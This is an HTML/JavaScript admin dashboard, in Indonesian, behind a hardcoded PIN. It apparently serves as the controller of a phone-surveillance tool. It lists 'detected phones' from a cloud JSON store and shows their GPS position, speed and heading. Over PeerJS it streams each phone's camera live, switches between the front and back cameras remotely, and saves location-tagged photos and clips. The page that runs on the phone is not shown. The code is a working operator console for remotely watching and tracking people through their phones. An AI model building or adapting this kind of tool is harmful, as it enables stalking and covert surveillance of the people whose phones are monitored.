<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Realtime - Deteksi HP & Koneksi Cepat</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
        .container { max-width: 960px; margin: 0 auto; }

        #loginScreen {
            max-width: 360px; margin: 100px auto; background: #1e293b;
            padding: 28px; border-radius: 14px; border: 1px solid #334155; text-align: center;
        }
        #loginScreen h2 { margin-bottom: 16px; font-size: 20px; }
        #loginScreen input {
            width: 100%; padding: 12px; margin-bottom: 14px; border-radius: 8px;
            border: 1px solid #475569; background: #0f172a; color: #fff; text-align: center; font-size: 16px;
        }

        #dashboard { display: none; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 12px; margin-bottom: 18px;
            padding-bottom: 16px; border-bottom: 1px solid #334155;
        }
        .header h1 { font-size: 22px; }
        button {
            padding: 10px 15px; border: none; border-radius: 8px;
            font-weight: 600; cursor: pointer; font-size: 13px;
        }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-primary:hover { background: #2563eb; }
        .btn-connect { background: #10b981; color: white; }
        .btn-connect:hover { background: #059669; }
        .btn-cam { background: #6366f1; color: white; }
        .btn-cam:hover { background: #4f46e5; }
        .btn-photo { background: #0ea5e9; color: white; }
        .btn-photo:hover { background: #0284c7; }
        .btn-rec { background: #ef4444; color: white; }
        .btn-rec:hover { background: #dc2626; }

        .devices-box {
            background: #1e293b; border: 1px solid #334155;
            border-radius: 14px; padding: 16px; margin-bottom: 20px;
        }
        .devices-top {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 10px; margin-bottom: 12px;
        }
        .devices-title { font-size: 15px; color: #e2e8f0; }
        .device-list { display: grid; gap: 10px; }
        .device-item {
            background: #0f172a; border: 1px solid #334155; border-radius: 10px;
            padding: 12px 14px; display: flex; justify-content: space-between;
            align-items: center; flex-wrap: wrap; gap: 10px;
        }
        .device-item strong { font-size: 14px; color: #fff; }
        .device-item small { display: block; font-size: 11px; color: #94a3b8; margin-top: 3px; }
        .badge-on {
            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 999px;
            background: rgba(34, 197, 94, 0.16); color: #4ade80; margin-left: 6px;
        }
        .badge-off {
            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 999px;
            background: rgba(148, 163, 184, 0.16); color: #cbd5e1; margin-left: 6px;
        }

        .stage {
            background: #1e293b; border: 1px solid #334155;
            border-radius: 14px; padding: 16px; margin-bottom: 22px;
        }
        .video-wrap {
            position: relative; width: 100%; max-width: 560px; aspect-ratio: 4 / 3;
            margin: 0 auto 14px; background: #020617; border-radius: 12px;
            overflow: hidden; border: 1px solid #334155; display: flex;
            align-items: center; justify-content: center;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        .overlay-top {
            position: absolute; top: 10px; left: 10px; right: 10px;
            display: flex; justify-content: space-between; gap: 8px; pointer-events: none;
        }
        .pill {
            font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
            background: rgba(15, 23, 42, 0.82); color: #e2e8f0;
        }
        .pill-live { background: rgba(239, 68, 68, 0.92); color: #fff; }

        .meta-bar {
            background: #0f172a; border: 1px solid #334155; border-radius: 10px;
            padding: 12px; margin-bottom: 12px; font-size: 12px; color: #cbd5e1;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 10px;
        }
        .btn-map {
            background: #0ea5e9; color: #fff; text-decoration: none;
            padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 600;
        }
        .controls { display: flex; gap: 10px; flex-wrap: wrap; }
        .info-text { font-size: 12px; color: #94a3b8; margin-top: 10px; }

        .captures-grid { display: grid; gap: 14px; }
        .cap-card {
            background: #1e293b; border: 1px solid #334155; border-radius: 12px;
            padding: 14px; display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 14px;
        }
        .cap-card img, .cap-card video {
            width: 180px; height: 135px; object-fit: cover; border-radius: 8px; background: #020617;
        }
        .btn-dl {
            background: #475569; color: #fff; text-decoration: none;
            padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 600;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body>

<div class="container">
    <div id="loginScreen">
        <h2>🔒 Login Admin</h2>
        <input type="password" id="pinInput" placeholder="Masukkan PIN Admin" onkeypress="if(event.key==='Enter') checkPin()">
        <button class="btn-primary" style="width:100%" onclick="checkPin()">Masuk</button>
    </div>

    <div id="dashboard">
        <div class="header">
            <div>
                <h1>📹 Deteksi HP & Live View</h1>
            </div>
            <div>
                <button class="btn-primary" onclick="loadDetectedDevices()">🔄 Cek HP Terdeteksi</button>
            </div>
        </div>

        <div class="devices-box">
            <div class="devices-top">
                <h2 class="devices-title">📱 HP Terdeteksi & Asal Lokasi</h2>
                <span style="font-size:11px;color:#94a3b8;">Klik Hubungkan → koneksi terhubung ~5 detik</span>
            </div>
            <div id="deviceList" class="device-list">
                <div class="device-item"><div><small>Memeriksa perangkat...</small></div></div>
            </div>
        </div>

        <div class="stage">
            <div class="video-wrap">
                <div class="overlay-top">
                    <div style="display:flex;gap:6px;">
                        <span class="pill pill-live" id="connBadge">BELUM TERHUBUNG</span>
                        <span class="pill" id="camBadge">KAMERA: -</span>
                    </div>
                    <span class="pill" id="recBadge" style="display:none;background:#dc2626;color:#fff;">● MEREKAM</span>
                </div>
                <video id="remoteVideo" autoplay playsinline></video>
                <span id="placeholderText" style="color:#64748b;font-size:13px;">Pilih HP yang terdeteksi lalu klik Hubungkan.</span>
            </div>

            <div class="meta-bar">
                <div id="locText"><strong>Lokasi / Asal HP:</strong> Menunggu data...</div>
                <div id="mapLinkWrap"></div>
            </div>

            <div class="controls">
                <button class="btn-cam" onclick="switchCamera('user')">🤳 Kamera Depan</button>
                <button class="btn-cam" onclick="switchCamera('environment')">📷 Kamera Belakang</button>
                <button class="btn-photo" onclick="snapPhoto()">📸 Ambil Foto</button>
                <button class="btn-rec" id="btnRec" onclick="recordClip()">🎥 Rekam Klip (5d)</button>
            </div>
            <div id="statusMsg" class="info-text">Status: Siap.</div>
        </div>

        <h2 style="font-size:16px;margin-bottom:12px;">Hasil Foto & Rekaman Lokal</h2>
        <div id="capturesList" class="captures-grid"></div>
    </div>
</div>

<script>
    const ADMIN_PIN = "123456";
    const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";

    let peer = null;
    let dataConn = null;
    let currentCall = null;
    let currentMediaStream = null;
    let currentCamLabel = "-";
    let currentLoc = null;
    let connectWatchdog = null;

    const remoteVideo = document.getElementById("remoteVideo");
    const placeholderText = document.getElementById("placeholderText");
    const connBadge = document.getElementById("connBadge");
    const camBadge = document.getElementById("camBadge");
    const recBadge = document.getElementById("recBadge");
    const locText = document.getElementById("locText");
    const mapLinkWrap = document.getElementById("mapLinkWrap");
    const statusMsg = document.getElementById("statusMsg");
    const capturesList = document.getElementById("capturesList");
    const deviceListEl = document.getElementById("deviceList");

    function checkPin() {
        const val = document.getElementById("pinInput").value;
        if (val === ADMIN_PIN) {
            document.getElementById("loginScreen").style.display = "none";
            document.getElementById("dashboard").style.display = "block";
            loadDetectedDevices();
        } else {
            alert("PIN salah!");
        }
    }

    async function loadDetectedDevices() {
        try {
            const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
            if (!res.ok) throw new Error("Gagal memuat");
            const data = await res.json();
            const devicesMap = data.devices && typeof data.devices === "object" ? data.devices : {};
            const list = Object.values(devicesMap).sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));

            if (list.length === 0) {
                deviceListEl.innerHTML = `
                    <div class="device-item">
                        <div>
                            <strong>Belum ada HP terdeteksi</strong>
                            <small>Buka halaman di HP lalu izinkan lokasi & kamera agar HP muncul di sini.</small>
                        </div>
                    </div>
                `;
                return;
            }

            deviceListEl.innerHTML = list.map(dev => {
                const loc = dev.location;
                const hasLoc = loc && loc.lat !== undefined && loc.lng !== undefined;
                const locStr = hasLoc ? `${loc.lat}, ${loc.lng} (±${loc.accuracy || "-"})` : "Lokasi belum ada";
                const mapHref = hasLoc ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}` : "";
                const ageSec = dev.updatedAt ? Math.max(0, Math.round((Date.now() - dev.updatedAt) / 1000)) : null;
                const isRecent = ageSec !== null && ageSec <= 120;

                const badge = isRecent
                    ? `<span class="badge-on">Terdeteksi (${ageSec}d lalu)</span>`
                    : `<span class="badge-off">Riwayat (${ageSec ?? "-"}d lalu)</span>`;

                return `
                    <div class="device-item">
                        <div>
                            <strong>${escapeHtml(dev.name || "HP Saya")}</strong> ${badge}
                            <small>Asal Koordinat: ${escapeHtml(locStr)} • Kamera: ${escapeHtml(dev.facing || "Depan")}</small>
                        </div>
                        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
                            ${hasLoc ? `<a class="btn-map" href="${mapHref}" target="_blank">Cek Asal Maps ↗</a>` : ""}
                            <button class="btn-connect" onclick="connectWithin5Sec('${escapeHtml(dev.peerId)}')">Hubungkan</button>
                        </div>
                    </div>
                `;
            }).join("");
        } catch (err) {
            deviceListEl.innerHTML = `<div class="device-item"><div><small style="color:#f87171;">Gagal memuat daftar HP.</small></div></div>`;
        }
    }

    function updateLocationUI(loc) {
        currentLoc = loc;
        if (!loc || loc.lat === undefined || loc.lng === undefined) {
            locText.innerHTML = "<strong>Lokasi / Asal HP:</strong> Menunggu koordinat...";
            mapLinkWrap.innerHTML = "";
            return;
        }
        locText.innerHTML = `
            <strong>Lokasi / Asal HP:</strong> ${loc.lat}, ${loc.lng} (${loc.accuracy || "-"}) •
            <strong>Kecepatan:</strong> ${loc.speed || "-"} •
            <strong>Arah:</strong> ${loc.heading || "-"}
        `;
        mapLinkWrap.innerHTML = `<a class="btn-map" href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">Buka Maps ↗</a>`;
    }

    function connectWithin5Sec(peerId) {
        if (connectWatchdog) {
            clearTimeout(connectWatchdog);
            connectWatchdog = null;
        }
        if (currentCall) { currentCall.close(); currentCall = null; }
        if (dataConn) { dataConn.close(); dataConn = null; }
        if (peer) { peer.destroy(); peer = null; }

        connBadge.textContent = "MENGHUBUNGKAN...";
        statusMsg.textContent = "Status: Menghubungkan ke HP (target ~5 detik)...";

        let streamConnected = false;

        connectWatchdog = setTimeout(() => {
            if (!streamConnected) {
                statusMsg.textContent = "Status: Belum tersambung dalam 5 detik. Pastikan halaman di HP terbuka & sudah diizinkan.";
            }
        }, 5000);

        peer = new Peer();

        peer.on("open", () => {
            dataConn = peer.connect(peerId);
            dataConn.on("open", () => {
                dataConn.send({ type: "PING" });
            });
            dataConn.on("data", (msg) => {
                if (!msg) return;
                if (msg.type === "LIVE_STATUS") {
                    currentCamLabel = msg.facing || "-";
                    camBadge.textContent = "KAMERA: " + currentCamLabel.toUpperCase();
                    updateLocationUI(msg.location);
                }
            });
            dataConn.on("close", () => {
                if (!streamConnected) return;
                connBadge.textContent = "TERPUTUS";
                statusMsg.textContent = "Status: Koneksi terputus.";
            });

            const dummyCanvas = document.createElement("canvas");
            dummyCanvas.width = 64;
            dummyCanvas.height = 64;
            const dummyStream = dummyCanvas.captureStream(1);

            currentCall = peer.call(peerId, dummyStream);
            if (currentCall) {
                currentCall.on("stream", (remoteStream) => {
                    streamConnected = true;
                    if (connectWatchdog) {
                        clearTimeout(connectWatchdog);
                        connectWatchdog = null;
                    }
                    currentMediaStream = remoteStream;
                    remoteVideo.srcObject = remoteStream;
                    remoteVideo.style.display = "block";
                    placeholderText.style.display = "none";
                    connBadge.textContent = "LIVE TERHUBUNG";
                    statusMsg.textContent = "Status: Tersambung realtime ke HP.";
                });
            }
        });

        peer.on("error", () => {
            if (connectWatchdog) {
                clearTimeout(connectWatchdog);
                connectWatchdog = null;
            }
            connBadge.textContent = "OFFLINE";
            statusMsg.textContent = "Status: HP tidak aktif atau aplikasi Chrome sudah ditutup.";
        });
    }

    function switchCamera(facing) {
        if (!dataConn || !dataConn.open) {
            alert("Hubungkan ke HP terlebih dahulu.");
            return;
        }
        statusMsg.textContent = "Status: Mengganti kamera...";
        dataConn.send({ type: "SWITCH_CAM", facing: facing });
    }

    function addCaptureCard(htmlContent) {
        const card = document.createElement("div");
        card.className = "cap-card";
        card.innerHTML = htmlContent;
        capturesList.prepend(card);
    }

    function snapPhoto() {
        if (!currentMediaStream || remoteVideo.readyState < 2) {
            alert("Belum ada stream video aktif.");
            return;
        }
        const c = document.createElement("canvas");
        c.width = remoteVideo.videoWidth || 640;
        c.height = remoteVideo.videoHeight || 480;
        c.getContext("2d").drawImage(remoteVideo, 0, 0, c.width, c.height);
        const dataUrl = c.toDataURL("image/jpeg", 0.8);
        const fileName = `foto_${Date.now()}.jpg`;
        const locStr = currentLoc ? `${currentLoc.lat}, ${currentLoc.lng}` : "-";

        addCaptureCard(`
            <div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;">
                <img src="${dataUrl}" alt="Foto">
                <div>
                    <strong style="font-size:15px;">Foto (${currentCamLabel})</strong>
                    <p style="font-size:12px;color:#94a3b8;margin-top:4px;">Lokasi: ${locStr}</p>
                    <p style="font-size:12px;color:#94a3b8;">Waktu: ${new Date().toLocaleTimeString("id-ID")}</p>
                </div>
            </div>
            <a class="btn-dl" href="${dataUrl}" download="${fileName}">⬇ Unduh Foto</a>
        `);
    }

    function recordClip() {
        if (!currentMediaStream || !window.MediaRecorder) {
            alert("Stream video atau MediaRecorder tidak tersedia.");
            return;
        }
        const btnRec = document.getElementById("btnRec");
        btnRec.disabled = true;
        recBadge.style.display = "inline-block";
        statusMsg.textContent = "Status: Merekam klip 5 detik...";

        const chunks = [];
        let recorder;
        try {
            recorder = new MediaRecorder(currentMediaStream);
        } catch (e) {
            alert("Gagal memulai perekaman.");
            btnRec.disabled = false;
            recBadge.style.display = "none";
            return;
        }

        recorder.ondataavailable = (ev) => {
            if (ev.data && ev.data.size > 0) chunks.push(ev.data);
        };
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: recorder.mimeType || "video/webm" });
            const url = URL.createObjectURL(blob);
            const fileName = `rekaman_${Date.now()}.webm`;
            const locStr = currentLoc ? `${currentLoc.lat}, ${currentLoc.lng}` : "-";

            addCaptureCard(`
                <div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;">
                    <video src="${url}" controls playsinline></video>
                    <div>
                        <strong style="font-size:15px;">Rekaman Klip (${currentCamLabel})</strong>
                        <p style="font-size:12px;color:#94a3b8;margin-top:4px;">Lokasi: ${locStr}</p>
                        <p style="font-size:12px;color:#94a3b8;">Waktu: ${new Date().toLocaleTimeString("id-ID")}</p>
                    </div>
                </div>
                <a class="btn-dl" href="${url}" download="${fileName}">⬇ Unduh Rekaman</a>
            `);

            btnRec.disabled = false;
            recBadge.style.display = "none";
            statusMsg.textContent = "Status: Rekaman selesai.";
        };

        recorder.start();
        setTimeout(() => {
            if (recorder.state === "recording") recorder.stop();
        }, 5000);
    }

    function escapeHtml(text) {
        if (!text) return "";
        return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    }
</script>

</body>
</html>
